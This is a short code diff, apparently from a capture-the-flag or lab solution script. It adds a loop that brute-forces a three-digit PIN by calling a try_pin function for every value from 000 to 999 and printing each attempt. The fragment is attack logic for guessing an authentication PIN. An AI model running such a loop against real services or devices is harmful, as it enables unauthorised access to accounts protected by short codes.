@@ -32,3 +32,7 @@ def try_pin(pin):
 
     decoded = response.decode(errors="ignore")
     return decoded, pin_str
+
+for pin in range(1000):
+    response, pin_str = try_pin(pin)
+    print(f"Try pin {pin_str}...")
